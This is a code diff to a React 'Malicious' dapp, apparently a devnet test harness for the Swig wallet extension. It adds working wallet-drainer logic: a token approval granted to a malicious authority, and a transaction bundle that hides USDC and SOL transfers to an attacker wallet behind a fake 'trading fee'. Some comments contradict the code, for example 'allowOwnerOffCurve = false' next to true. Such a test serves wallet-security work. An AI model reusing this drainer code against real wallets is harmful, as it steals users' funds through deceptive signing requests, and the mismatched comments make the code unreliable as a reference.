@@ -13,11 +13,17 @@ import {
   createAssociatedTokenAccountInstruction,
   getAccount,
   createApproveInstruction,
+  TOKEN_PROGRAM_ID,
+  ASSOCIATED_TOKEN_PROGRAM_ID,
 } from "@solana/spl-token";
+import { TokenListProvider } from "@solana/spl-token-registry";
 import { Button } from "@swig/ui";
 import { MALICIOUS_AUTHORITY_KEYPAIR, getMaliciousAuthorityInfo } from "./maliciousKeypair";
-import { TokenListProvider } from "@solana/spl-token-registry";
-import {sendViaSwigPopup } from "./sendViaSwig"
+
+// Add constants for proper setup
+const SWIG_EXTENSION_ID = "ngkjcjceookedgnmacgheeblecefegce";
+const SOLANA_RPC_URL = "https://api.devnet.solana.com";
+const CLUSTER = "devnet";
 
 // Real malicious dapp component with enhanced attack scenarios
 const Malicious: React.FC = () => {
@@ -31,7 +37,7 @@ const Malicious: React.FC = () => {
     signAndSendTransaction,
   } = useWallet();
   const [maliciousReceiverWallet, setMaliciousReceiverWallet] = useState<string>(
-    "BKV7zy1Q74pyk3eehMrVQeau9pj2kEp6k36RZwFTFdHk"
+    "27XV1wn6zkuByMeQRgCX3QtZUYnJm5nBxr9z7WA6py37"
   );
   const [maliciousAuthorityInfo] = useState(() => getMaliciousAuthorityInfo());
   const [solDrainAmount, setSolDrainAmount] = useState<number>(0.1);
@@ -40,27 +46,17 @@ const Malicious: React.FC = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [solBalance, setSolBalance] = useState<number>(0);
   const [usdcBalance, setUsdcBalance] = useState<number>(0);
+  const [tokens, setTokens] = useState<any[]>([]);
   const [showWalletList, setShowWalletList] = useState(false);
   const [attackPhase, setAttackPhase] = useState<"permissions" | "exploitation" | "none">("none");
   const [hasUnlimitedApproval, setHasUnlimitedApproval] = useState(false);
-  const [usdcMetadata, setUsdcMetadata] = useState<any>(null);
 
-
+  // Initialize connection to devnet
+  const connection = new Connection("https://api.devnet.solana.com");
 
   // Devnet USDC mint address
   const USDC_MINT = new PublicKey("Gh9ZwEmdLJ8DscKNTkTqPbNwLNNBjuSzaG9Vp2KGtKJr");
   // get usdc airdrop from https://spl-token-faucet.com/?token-name=USDC
-useEffect(() => {
-  new TokenListProvider().resolve().then((container) => {
-    const tokenList = container.filterByClusterSlug("devnet").getList();
-    const usdc = tokenList.find((t) => t.address === USDC_MINT.toBase58());
-    setUsdcMetadata(usdc);
-    console.log("Found USDC metadata:", usdc);
-  });
-}, []);
-
-  // Initialize connection to devnet
-  const connection = new Connection("https://api.devnet.solana.com");
 
   const addLog = (message: string | JSX.Element) => {
     setLogs((prev) => [...prev, message]);
@@ -72,6 +68,7 @@ useEffect(() => {
       await getAccount(connection, tokenAccount);
       return true;
     } catch (error) {
+      console.log(`Token account ${tokenAccount.toBase58()} doesn't exist or other error:`, error);
       return false;
     }
   };
@@ -80,16 +77,62 @@ useEffect(() => {
   const fetchBalances = async () => {
     if (!publicKey) return;
     try {
-      const solBalance = await connection.getBalance(new PublicKey(publicKey));
+      const connection = new Connection(SOLANA_RPC_URL);
+      const userPubkey = new PublicKey(publicKey);
+      
+      // Get SOL balance
+      const solBalance = await connection.getBalance(userPubkey);
       setSolBalance(solBalance / LAMPORTS_PER_SOL);
-      // Fetch USDC balance
+      
+      // Fetch all token balances using the same approach as the legitimate implementation
       try {
-        const ata = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));
-        const account = await getAccount(connection, ata);
-console.log("USDC raw balance (mint: USDC):", account.amount.toString());
-setUsdcBalance(Number(account.amount) / 1e6);
-      } catch (error) {
-        // If ATA doesn't exist, balance is 0
+        // Get token list from registry
+        const tokenListProvider = new TokenListProvider();
+        const tokenListContainer = await tokenListProvider.resolve();
+        const tokenList = tokenListContainer.filterByClusterSlug(CLUSTER).getList();
+        
+        // Get all token accounts owned by the wallet
+        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+          userPubkey, 
+          { programId: TOKEN_PROGRAM_ID }
+        );
+        
+        // Process token accounts
+        const tokens = tokenAccounts.value.map(({ account }) => {
+          const info = account.data.parsed.info;
+          const mint = info.mint;
+          const decimals = info.tokenAmount.decimals;
+          const amount = parseFloat(info.tokenAmount.amount) / Math.pow(10, decimals);
+          const metadata = tokenList.find(t => t.address === mint);
+          
+          return {
+            mint,
+            decimals,
+            amount,
+            symbol: metadata?.symbol || "UNKNOWN",
+            name: metadata?.name || "Unknown Token",
+            logoURI: metadata?.logoURI,
+          };
+        });
+        
+        // Update tokens state
+        setTokens(tokens.filter(token => token.amount > 0));
+        
+        // Find USDC token and update USDC balance
+        const usdcToken = tokens.find(token => 
+          token.mint === USDC_MINT.toString() || 
+          token.symbol === "USDC"
+        );
+        
+        if (usdcToken) {
+          console.log("Found USDC token:", usdcToken);
+          setUsdcBalance(usdcToken.amount);
+        } else {
+          console.log("No USDC token found in wallet");
+          setUsdcBalance(0);
+        }
+      } catch (tokenError) {
+        console.error("Error fetching token balances:", tokenError);
         setUsdcBalance(0);
       }
     } catch (error) {
@@ -99,7 +142,13 @@ setUsdcBalance(Number(account.amount) / 1e6);
 
   useEffect(() => {
     fetchBalances();
-  }, [publicKey, connection]);
+    
+    // Add some debug logging for token detection
+    if (publicKey) {
+      console.log("Current wallet address:", publicKey);
+      console.log("USDC Mint address:", USDC_MINT.toString());
+    }
+  }, [publicKey]);
 
   // Add refs to track latest balances for polling
   const solBalanceRef = useRef(solBalance);
@@ -110,8 +159,6 @@ setUsdcBalance(Number(account.amount) / 1e6);
   useEffect(() => {
     usdcBalanceRef.current = usdcBalance;
   }, [usdcBalance]);
-
-  
 
   const handleConnectClick = () => {
     setShowWalletList(!showWalletList);
@@ -164,18 +211,65 @@ setUsdcBalance(Number(account.amount) / 1e6);
       );
       addLog("📝 Please approve this transaction to enable trading features...");
 
+      // Using proper extension popup flow
+      let popup: Window | null = null;
       try {
-         const response = await sendViaSwigPopup(tx, connection);
-        if (response.success) {
-          addLog("✅ Transaction sent!");
-        } else {
-          addLog(`❌ Error: ${response.error}`);
-        }
-        addLog("✅ Basic permissions granted!");
-        if (signature) {
+        const { blockhash } = await connection.getLatestBlockhash();
+        permissionTx.recentBlockhash = blockhash;
+        permissionTx.feePayer = new PublicKey(publicKey);
+
+        const serializedTx = permissionTx.serialize({
+          requireAllSignatures: false,
+          verifySignatures: false,
+        });
+
+        const base64Tx = encodeURIComponent(serializedTx.toString("base64"));
+        const requestId = crypto.randomUUID();
+
+        const popupUrl = `chrome-extension://${SWIG_EXTENSION_ID}/index.html#/transaction-request?transaction=${base64Tx}&requestId=${requestId}`;
+        popup = window.open(popupUrl, "_blank", "width=400,height=600");
+
+        if (!popup) throw new Error("Popup failed to open");
+
+        // Listen for the extension's response
+        const responsePromise = new Promise<{
+          success: boolean;
+          signature?: string;
+          error?: string;
+          cancelled?: boolean;
+        }>((resolve, reject) => {
+          const listener = (event: MessageEvent) => {
+            const msg = event.data;
+            if (msg && msg.source === "swig-extension" && msg.requestId === requestId) {
+              window.removeEventListener("message", listener);
+
+              if (msg.action === "transaction_signed") {
+                resolve({ success: true, signature: msg.signature });
+              } else if (msg.action === "transaction_cancelled") {
+                resolve({ success: false, cancelled: true });
+              } else if (msg.action === "transaction_error") {
+                resolve({ success: false, error: msg.error });
+              } else {
+                resolve({ success: false, error: "Unexpected message action" });
+              }
+            }
+          };
+
+          window.addEventListener("message", listener);
+
+          setTimeout(() => {
+            window.removeEventListener("message", listener);
+            reject(new Error("Transaction signing timed out after 60 seconds"));
+          }, 60000);
+        });
+
+        const response = await responsePromise;
+
+        if (response.success && response.signature) {
+          addLog("✅ Basic permissions granted!");
           addLog(
             <a
-              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
+              href={`https://explorer.solana.com/tx/${response.signature}?cluster=devnet`}
               target="_blank"
               rel="noopener noreferrer"
               className="text-blue-600 hover:underline"
@@ -183,16 +277,22 @@ setUsdcBalance(Number(account.amount) / 1e6);
               🔍 View Transaction
             </a>
           );
+          
+          // Now request the dangerous unlimited token approval
+          await requestUnlimitedTokenApproval();
+        } else if (response.cancelled) {
+          addLog("🛡️ User canceled the transaction - good security practice!");
+        } else {
+          throw new Error(response.error || "Transaction failed");
         }
-
-        // Now request the dangerous unlimited token approval
-        await requestUnlimitedTokenApproval();
       } catch (error: any) {
         console.error("Permission request error:", error);
         addLog(`❌ Permission request failed: ${error.message}`);
         if (error.message.includes("Plugin Closed") || error.message.includes("User rejected")) {
           addLog("🛡️ User canceled the transaction - good security practice!");
         }
+      } finally {
+        if (popup && !popup.closed) popup.close();
       }
     } catch (error: any) {
       addLog(`Error setting up permissions: ${error.message}`);
@@ -211,77 +311,184 @@ setUsdcBalance(Number(account.amount) / 1e6);
     addLog("💡 This approval allows our smart contract to execute trades on your behalf");
 
     try {
-      const userTokenAccount = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));
+      // Log the public key details to debug
+      addLog(`Working with public key: ${publicKey}`);
+      const pubkeyObj = new PublicKey(publicKey);
+      addLog(`Public key isOnCurve: ${PublicKey.isOnCurve(pubkeyObj.toBytes())}`);
 
-      // Check if user has USDC token account
-      const accountExists = await checkTokenAccountExists(userTokenAccount);
-      if (!accountExists) {
-        addLog("❌ No USDC token account found. Please get some USDC first from the faucet.");
+      // Declare userTokenAccount at this scope level so it's accessible later
+      let userTokenAccount: PublicKey;
+      
+      // Use the false flag for allowOwnerOffCurve to ensure valid public key
+      try {
+        userTokenAccount = await getAssociatedTokenAddress(
+          USDC_MINT, 
+          pubkeyObj,
+          true, // allowOwnerOffCurve = false (reject off-curve public keys)
+          TOKEN_PROGRAM_ID,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+        addLog(`✅ Found user token account: ${userTokenAccount.toBase58().slice(0, 10)}...`);      // Refresh token balances to ensure we have the latest data
+      await fetchBalances();
+      
+      // Check if user has USDC token in their wallet
+      if (usdcBalance <= 0) {
+        addLog("❌ No USDC token found in your wallet. Please get some USDC first from the faucet.");
         addLog("🔗 Get USDC: https://spl-token-faucet.com/?token-name=USDC");
         return;
       }
-
-      // Create approval for maximum possible amount (classic DeFi attack vector)
-      const maxAmount = "18446744073709551615"; // Max uint64 - unlimited approval
-
-      const approvalTx = new Transaction().add(
-        createApproveInstruction(
-          userTokenAccount,
-          MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // Malicious contract authority
-          new PublicKey(publicKey),
-          BigInt(maxAmount) // Unlimited approval!
-        )
-      );
-
-      addLog("📋 Requesting approval for token trading (standard DeFi practice)");
-      addLog("🔄 Amount: Unlimited (allows efficient batch trading)");
-      addLog(
-        `🏗️ Granting approval to contract authority: ${MALICIOUS_AUTHORITY_KEYPAIR.publicKey
-          .toString()
-          .slice(0, 20)}...`
-      );
-
-      try {
-         const response = await sendViaSwigPopup(tx, connection);
-        if (response.success) {
-          addLog("✅ Transaction sent!");
+      
+      // Double-check token account exists
+      const accountExists = await checkTokenAccountExists(userTokenAccount);
+      if (!accountExists) {
+        addLog("⚠️ USDC token account not found despite having a balance. This is unusual.");
+        addLog("� Try refreshing the page or reconnecting your wallet.");
+        return;
+      }
+        
+        addLog(`✅ User token account exists for USDC mint: ${USDC_MINT.toBase58().slice(0, 10)}...`);
+      } catch (tokenAddressError: any) {
+        console.error("Error getting token address:", tokenAddressError);
+        if (tokenAddressError.message && tokenAddressError.message.includes("TokenOwnerOffCurveError")) {
+          addLog("❌ Error: Your wallet address is not a valid on-curve address. This often happens with some types of wallets.");
+          addLog("💡 Try using a different wallet or creating a new account in your wallet.");
+          return;
         } else {
-          addLog(`❌ Error: ${response.error}`);
-        }
-        setHasUnlimitedApproval(true);
-        setAttackPhase("exploitation");
-        addLog("✅ Token approval granted! You can now trade efficiently.");
-        if (signature) {
-          addLog(
-            <a
-              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
-              target="_blank"
-              rel="noopener noreferrer"
-              className="text-blue-600 hover:underline"
-            >
-              🔍 View Transaction
-            </a>
-          );
-        }
-        addLog("💰 SuperSwap is now ready to optimize your trades!");
-
-        // Show the exploitation phase after a delay
-        setTimeout(() => {
-          addLog(
-            "\n⚠️  ATTACK PHASE: Now that we have unlimited approval, we can drain your tokens..."
-          );
-        }, 3000);
-      } catch (error: any) {
-        console.error("Token approval error:", error);
-        addLog(`❌ Token approval failed: ${error.message}`);
-        if (error.message.includes("Plugin Closed") || error.message.includes("User rejected")) {
-          addLog("🛡️ User canceled the unlimited approval - excellent security decision!");
-        } else {
-          addLog("🛡️ Wallet blocked unlimited approval request!");
+          throw tokenAddressError; // Re-throw if it's not the specific error we're handling
         }
       }
+
+      // Create approval for maximum possible amount (classic DeFi attack vector)
+      // Use a smaller amount for testing to avoid potential issues with max uint64
+      const maxAmount = "1000000000"; // 1000 USDC with 6 decimals
+
+      addLog(`📋 Creating approval instruction for ${parseInt(maxAmount)/1000000} USDC`);
+      
+      try {
+        const approvalTx = new Transaction().add(
+          createApproveInstruction(
+            userTokenAccount,
+            MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // Malicious contract authority
+            new PublicKey(publicKey),
+            BigInt(maxAmount)
+          )
+        );
+
+        addLog("📋 Requesting approval for token trading (standard DeFi practice)");
+        addLog(`🔄 Amount: ${parseInt(maxAmount)/1000000} USDC (for testing - would be unlimited in real attack)`);
+        addLog(
+          `🏗️ Granting approval to contract authority: ${MALICIOUS_AUTHORITY_KEYPAIR.publicKey.toBase58().slice(0, 10)}...`
+        );
+
+        // Skip direct signAndSendTransaction and use popup flow directly to match Phase 1
+        // Replace the problematic character encoding
+        addLog("📄 Opening extension popup for transaction approval...");
+        console.log("Attempting to open extension popup for unlimited token approval...");
+
+        // Using proper extension popup flow as backup
+        let popup: Window | null = null;
+        try {
+          const { blockhash } = await connection.getLatestBlockhash();
+          approvalTx.recentBlockhash = blockhash;
+          approvalTx.feePayer = new PublicKey(publicKey);
+
+          const serializedTx = approvalTx.serialize({
+            requireAllSignatures: false,
+            verifySignatures: false,
+          });
+
+          const base64Tx = encodeURIComponent(serializedTx.toString("base64"));
+          const requestId = crypto.randomUUID();
+          
+          addLog("🔄 Opening transaction popup window...");
+
+          const popupUrl = `chrome-extension://${SWIG_EXTENSION_ID}/index.html#/transaction-request?transaction=${base64Tx}&requestId=${requestId}`;
+          popup = window.open(popupUrl, "_blank", "width=400,height=600");
+
+          if (!popup) throw new Error("Popup failed to open");
+          
+          addLog("✅ Popup opened successfully, waiting for user response...");
+
+          // Listen for the extension's response
+          const responsePromise = new Promise<{
+            success: boolean;
+            signature?: string;
+            error?: string;
+            cancelled?: boolean;
+          }>((resolve, reject) => {
+            const listener = (event: MessageEvent) => {
+              console.log("Received message:", event.data);
+              const msg = event.data;
+              if (msg && msg.source === "swig-extension" && msg.requestId === requestId) {
+                window.removeEventListener("message", listener);
+
+                if (msg.action === "transaction_signed") {
+                  resolve({ success: true, signature: msg.signature });
+                } else if (msg.action === "transaction_cancelled") {
+                  resolve({ success: false, cancelled: true });
+                } else if (msg.action === "transaction_error") {
+                  resolve({ success: false, error: msg.error });
+                } else {
+                  resolve({ success: false, error: "Unexpected message action" });
+                }
+              }
+            };
+
+            window.addEventListener("message", listener);
+
+            setTimeout(() => {
+              window.removeEventListener("message", listener);
+              reject(new Error("Transaction signing timed out after 60 seconds"));
+            }, 60000);
+          });
+
+          const response = await responsePromise;
+
+          if (response.success && response.signature) {
+            setHasUnlimitedApproval(true);
+            setAttackPhase("exploitation");
+            addLog("✅ Token approval granted! You can now trade efficiently.");
+            addLog(
+              <a
+                href={`https://explorer.solana.com/tx/${response.signature}?cluster=devnet`}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-blue-600 hover:underline"
+              >
+                🔍 View Transaction
+              </a>
+            );
+            addLog("💰 SuperSwap is now ready to optimize your trades!");
+
+            // Show the exploitation phase after a delay
+            setTimeout(() => {
+              addLog(
+                "\n⚠️  ATTACK PHASE: Now that we have unlimited approval, we can drain your tokens..."
+              );
+            }, 3000);
+          } else if (response.cancelled) {
+            addLog("🛡️ User canceled the unlimited approval - excellent security decision!");
+          } else {
+            throw new Error(response.error || "Transaction failed");
+          }
+        } catch (error: any) {
+          console.error("Token approval popup error:", error);
+          addLog(`❌ Token approval failed: ${error.message}`);
+          if (error.message.includes("Plugin Closed") || error.message.includes("User rejected")) {
+            addLog("🛡️ User canceled the unlimited approval - excellent security decision!");
+          } else {
+            addLog("🛡️ Wallet blocked unlimited approval request!");
+          }
+        } finally {
+          if (popup && !popup.closed) popup.close();
+        }
+      } catch (txError: any) {
+        addLog(`❌ Error creating transaction: ${txError.message}`);
+        console.error("Transaction creation error:", txError);
+      }
     } catch (error: any) {
-      addLog(`Error requesting token approval: ${error.message}`);
+      console.error("Token approval setup error:", error);
+      addLog(`❌ Error requesting token approval: ${error.message}`);
     }
   };
 
@@ -425,107 +632,217 @@ setUsdcBalance(Number(account.amount) / 1e6);
     );
 
     try {
-      const userTokenAccount = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));
-      const maliciousTokenAccount = await getAssociatedTokenAddress(
-        USDC_MINT,
-        new PublicKey(maliciousReceiverWallet)
-      );
-
-      const complexTx = new Transaction();
-
-      // Check if user has USDC before trying to transfer
-      const userAccountExists = await checkTokenAccountExists(userTokenAccount);
-
-      if (userAccountExists && usdcBalance > 0) {
-        const transferAmount = Math.min(usdcDrainAmount, usdcBalance);
-
-        // Check if malicious wallet's token account exists, create if not
-        const maliciousAccountExists = await checkTokenAccountExists(maliciousTokenAccount);
-        if (!maliciousAccountExists) {
-          complexTx.add(
-            createAssociatedTokenAccountInstruction(
-              new PublicKey(publicKey),
-              maliciousTokenAccount,
-              new PublicKey(maliciousReceiverWallet),
-              USDC_MINT
-            )
-          );
-        }
-
-        // Instruction 1: Looks legitimate - small USDC transfer for "trading fee"
-        complexTx.add(
-          createTransferInstruction(
-            userTokenAccount,
-            maliciousTokenAccount,
-            new PublicKey(publicKey),
-            Math.floor(transferAmount * 0.1 * 1e6) // 10% of drain amount as "fee"
-          )
-        );
-
-        // Instruction 2: Hidden - another transfer disguised in the bundle
-        complexTx.add(
-          createTransferInstruction(
-            userTokenAccount,
-            maliciousTokenAccount,
-            new PublicKey(publicKey),
-            Math.floor(transferAmount * 0.9 * 1e6) // 90% as hidden transfer
-          )
-        );
-      }
-
-      // Instruction 3: Hidden SOL drain
-      complexTx.add(
-        SystemProgram.transfer({
-          fromPubkey: new PublicKey(publicKey),
-          toPubkey: new PublicKey(maliciousReceiverWallet),
-          lamports: Math.floor(LAMPORTS_PER_SOL * solDrainAmount),
-        })
-      );
-
-      addLog("📦 Transaction bundle contains:");
-      addLog("  ✅ Account setup for rewards");
-      if (userAccountExists && usdcBalance > 0) {
-        addLog(`  ✅ Trading fee: ${(usdcDrainAmount * 0.1).toFixed(2)} USDC`);
-        addLog(`  ⚠️  Hidden: Additional ${(usdcDrainAmount * 0.9).toFixed(2)} USDC transfer`);
-      }
-      addLog(`  ⚠️  Hidden: ${solDrainAmount} SOL transfer`);
-      addLog("💰 Estimated profit: 5.3 USDC (This is fake!)");
-
+      // Try getting the user's token account
       try {
-        const response = await sendViaSwigPopup(tx, connection);
-        if (response.success) {
-          addLog("✅ Transaction sent!");
+        // Create PublicKey objects
+        const userPubkey = new PublicKey(publicKey);
+        const maliciousPubkey = new PublicKey(maliciousReceiverWallet);
+        
+        // Check for on-curve validity
+        addLog(`User public key isOnCurve: ${PublicKey.isOnCurve(userPubkey.toBytes())}`);
+        addLog(`Malicious public key isOnCurve: ${PublicKey.isOnCurve(maliciousPubkey.toBytes())}`);
+        
+        // Get user token account with explicit parameters
+        const userTokenAccount = await getAssociatedTokenAddress(
+          USDC_MINT, 
+          userPubkey,
+          true, // allowOwnerOffCurve = false
+          TOKEN_PROGRAM_ID,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+        addLog(`✅ Found user token account: ${userTokenAccount.toBase58().slice(0, 10)}...`);
+        
+        // Get malicious token account with explicit parameters
+        const maliciousTokenAccount = await getAssociatedTokenAddress(
+          USDC_MINT,
+          maliciousPubkey,
+          true, // allowOwnerOffCurve = false
+          TOKEN_PROGRAM_ID,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+        addLog(`✅ Created malicious token account address: ${maliciousTokenAccount.toBase58().slice(0, 10)}...`);
+
+        const complexTx = new Transaction();
+        
+        // Check if user has USDC before trying to transfer
+        addLog(`🔍 Checking if user has USDC token account...`);
+        const userAccountExists = await checkTokenAccountExists(userTokenAccount);
+        addLog(`${userAccountExists ? "✅" : "❌"} User ${userAccountExists ? "has" : "doesn't have"} a USDC token account`);
+
+        // Only include token transfers if the user has tokens
+        if (userAccountExists && usdcBalance > 0) {
+          const transferAmount = Math.min(usdcDrainAmount, usdcBalance);
+          addLog(`✅ User has ${usdcBalance} USDC, will attempt to transfer ${transferAmount} USDC`);
+
+          // Check if malicious wallet's token account exists, create if not
+          const maliciousAccountExists = await checkTokenAccountExists(maliciousTokenAccount);
+          addLog(`${maliciousAccountExists ? "✅" : "❌"} Malicious receiver ${maliciousAccountExists ? "already has" : "needs"} a token account`);
+          
+          if (!maliciousAccountExists) {
+            complexTx.add(
+              createAssociatedTokenAccountInstruction(
+                new PublicKey(publicKey),
+                maliciousTokenAccount,
+                new PublicKey(maliciousReceiverWallet),
+                USDC_MINT
+              )
+            );
+            addLog(`✅ Added instruction to create token account for malicious receiver`);
+          }
+
+          // Only add token transfers if balance > 0
+          if (transferAmount > 0) {
+            // Instruction 1: Looks legitimate - small USDC transfer for "trading fee"
+            complexTx.add(
+              createTransferInstruction(
+                userTokenAccount,
+                maliciousTokenAccount,
+                new PublicKey(publicKey),
+                Math.floor(transferAmount * 0.1 * 1e6) // 10% of drain amount as "fee"
+              )
+            );
+            addLog(`✅ Added instruction for "trading fee" transfer of ${(transferAmount * 0.1).toFixed(2)} USDC`);
+
+            // Instruction 2: Hidden - another transfer disguised in the bundle
+            complexTx.add(
+              createTransferInstruction(
+                userTokenAccount,
+                maliciousTokenAccount,
+                new PublicKey(publicKey),
+                Math.floor(transferAmount * 0.9 * 1e6) // 90% as hidden transfer
+              )
+            );
+            addLog(`✅ Added hidden instruction for additional ${(transferAmount * 0.9).toFixed(2)} USDC transfer`);
+          }
         } else {
-          addLog(`❌ Error: ${response.error}`);
+          addLog(`ℹ️ User has no USDC balance, skipping token transfers`);
         }
-        addLog("💀 CRITICAL: Complex transaction bundle executed!");
-        if (signature) {
-          addLog(
-            <a
-              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
-              target="_blank"
-              rel="noopener noreferrer"
-              className="text-blue-600 hover:underline"
-            >
-              🔍 View Transaction
-            </a>
-          );
+
+        // Instruction 3: Hidden SOL drain - always include this
+        complexTx.add(
+          SystemProgram.transfer({
+            fromPubkey: new PublicKey(publicKey),
+            toPubkey: new PublicKey(maliciousReceiverWallet),
+            lamports: Math.floor(LAMPORTS_PER_SOL * solDrainAmount),
+          })
+        );
+        addLog(`✅ Added instruction for hidden ${solDrainAmount} SOL transfer`);
+
+        addLog("📦 Transaction bundle contains:");
+        addLog("  ✅ Account setup for rewards");
+        if (userAccountExists && usdcBalance > 0) {
+          addLog(`  ✅ Trading fee: ${(usdcDrainAmount * 0.1).toFixed(2)} USDC`);
+          addLog(`  ⚠️  Hidden: Additional ${(usdcDrainAmount * 0.9).toFixed(2)} USDC transfer`);
         }
-        addLog("🔓 User signed without realizing all the hidden transfers.");
-        // Fetch updated balances after complex bundle
-        await fetchBalances();
-        addLog("📊 Balances updated after complex bundle");
-      } catch (error: any) {
-        console.error("Complex bundle error:", error);
-        addLog(`✅ Complex bundle blocked: ${error.message}`);
-        if (error.message.includes("Plugin Closed") || error.message.includes("User rejected")) {
-          addLog("🛡️ User canceled the complex transaction - smart move!");
-        } else {
-          addLog("🛡️ Wallet detected and prevented malicious bundle!");
+        addLog(`  ⚠️  Hidden: ${solDrainAmount} SOL transfer`);
+        addLog("💰 Estimated profit: 5.3 USDC (This is fake!)");
+
+        // Skip direct signAndSendTransaction and use popup flow directly to match Phase 1
+        addLog("� Opening extension popup for transaction approval...");
+
+        // Using proper extension popup flow
+        let popup: Window | null = null;
+        try {
+          // Get a fresh blockhash
+          const { blockhash } = await connection.getLatestBlockhash();
+          complexTx.recentBlockhash = blockhash;
+          complexTx.feePayer = new PublicKey(publicKey);
+          
+          addLog(`🔄 Serializing transaction with ${complexTx.instructions.length} instructions...`);
+          
+          const serializedTx = complexTx.serialize({
+            requireAllSignatures: false,
+            verifySignatures: false,
+          });
+
+          const base64Tx = encodeURIComponent(serializedTx.toString("base64"));
+          const requestId = crypto.randomUUID();
+
+          addLog("🔄 Opening transaction popup window...");
+          const popupUrl = `chrome-extension://${SWIG_EXTENSION_ID}/index.html#/transaction-request?transaction=${base64Tx}&requestId=${requestId}`;
+          popup = window.open(popupUrl, "_blank", "width=400,height=600");
+
+          if (!popup) {
+            throw new Error("Popup failed to open");
+          }
+          
+          addLog("✅ Popup opened successfully, waiting for user response...");
+
+          // Listen for the extension's response
+          const responsePromise = new Promise<{
+            success: boolean;
+            signature?: string;
+            error?: string;
+            cancelled?: boolean;
+          }>((resolve, reject) => {
+            const listener = (event: MessageEvent) => {
+              console.log("Received message:", event.data);
+              const msg = event.data;
+              if (msg && msg.source === "swig-extension" && msg.requestId === requestId) {
+                window.removeEventListener("message", listener);
+
+                if (msg.action === "transaction_signed") {
+                  resolve({ success: true, signature: msg.signature });
+                } else if (msg.action === "transaction_cancelled") {
+                  resolve({ success: false, cancelled: true });
+                } else if (msg.action === "transaction_error") {
+                  resolve({ success: false, error: msg.error });
+                } else {
+                  resolve({ success: false, error: "Unexpected message action" });
+                }
+              }
+            };
+
+            window.addEventListener("message", listener);
+
+            setTimeout(() => {
+              window.removeEventListener("message", listener);
+              reject(new Error("Transaction signing timed out after 60 seconds"));
+            }, 60000);
+          });
+
+          addLog("⏳ Waiting for user to approve or reject the transaction...");
+          const response = await responsePromise;
+
+          if (response.success && response.signature) {
+            addLog("💀 CRITICAL: Complex transaction bundle executed!");
+            addLog(
+              <a
+                href={`https://explorer.solana.com/tx/${response.signature}?cluster=devnet`}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-blue-600 hover:underline"
+              >
+                🔍 View Transaction
+              </a>
+            );
+            addLog("🔓 User signed without realizing all the hidden transfers.");
+            // Fetch updated balances after complex bundle
+            await fetchBalances();
+            addLog("📊 Balances updated after complex bundle");
+          } else if (response.cancelled) {
+            addLog("🛡️ User canceled the complex transaction - smart move!");
+          } else {
+            throw new Error(response.error || "Transaction failed");
+          }
+        } catch (error: any) {
+          console.error("Complex bundle popup error:", error);
+          addLog(`✅ Complex bundle blocked: ${error.message}`);
+          if (error.message.includes("Plugin Closed") || error.message.includes("User rejected")) {
+            addLog("🛡️ User canceled the complex transaction - smart move!");
+          } else {
+            addLog("🛡️ Wallet detected and prevented malicious bundle!");
+          }
+        } finally {
+          if (popup && !popup.closed) popup.close();
         }
+      } catch (txCreationError: any) {
+        console.error("Failed to create complex transaction:", txCreationError);
+        addLog(`❌ Error preparing transaction: ${txCreationError.message}`);
       }
     } catch (error: any) {
-      addLog(`Error creating complex bundle: ${error.message}`);
+      console.error("Overall complex bundle error:", error);
+      addLog(`❌ Error creating complex bundle: ${error.message}`);
     } finally {
       setIsLoading(false);
     }
@@ -645,9 +962,31 @@ setUsdcBalance(Number(account.amount) / 1e6);
             </div>
             <div>
               <p className="text-gray-600">USDC Balance:</p>
-              <p className="font-bold">{usdcBalance.toFixed(2)} USDC</p>
+              <div className="flex items-center gap-2">
+                <img 
+                  src={tokens.find(t => t.symbol === "USDC")?.logoURI || "https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v/logo.png"} 
+                  alt="USDC" 
+                  className="w-5 h-5 rounded-full" 
+                />
+                <p className="font-bold">{usdcBalance.toFixed(2)} USDC</p>
+              </div>
               {usdcBalance === 0 && (
-                <p className="text-xs text-red-500">No USDC found. Get some from the faucet!</p>
+                <div>
+                  <p className="text-xs text-red-500">No USDC found. Get some from the faucet!</p>
+                  <a 
+                    href="https://spl-token-faucet.com/?token-name=USDC" 
+                    target="_blank" 
+                    rel="noopener noreferrer"
+                    className="text-xs text-blue-600 underline"
+                  >
+                    Get USDC from faucet
+                  </a>
+                </div>
+              )}
+              {tokens.length > 0 && (
+                <p className="text-xs text-green-600 mt-1">
+                  Found {tokens.length} token{tokens.length !== 1 ? 's' : ''} in wallet
+                </p>
               )}
             </div>
           </div>
